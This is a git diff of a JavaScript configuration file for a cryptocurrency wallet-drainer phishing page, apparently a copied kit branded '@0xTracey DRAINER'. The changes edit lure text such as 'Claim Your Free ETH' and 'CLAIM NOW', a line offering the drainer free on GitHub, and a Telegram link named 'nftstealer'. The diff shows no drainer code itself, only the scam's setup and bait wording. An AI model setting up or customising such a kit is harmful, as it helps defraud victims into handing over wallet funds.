@@ -18,12 +18,12 @@ const collectionInfo = {
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "Claim Your Free 1 ETH",
+    underTitle: "Claim Your Free ETH",
 }
 
 const claimPageInfo = {
     title: "@0xTracey DRAINER", // <br> is a line break
-    shortDescription: "Get this Drainer for free though Github. @Alcxpone",
+    shortDescription: "Get this Drainer for free though Github. @0xTracey",
     longDescription: "https://t.me/nftstealer",
 
     claimButtonText: "CLAIM NOW",
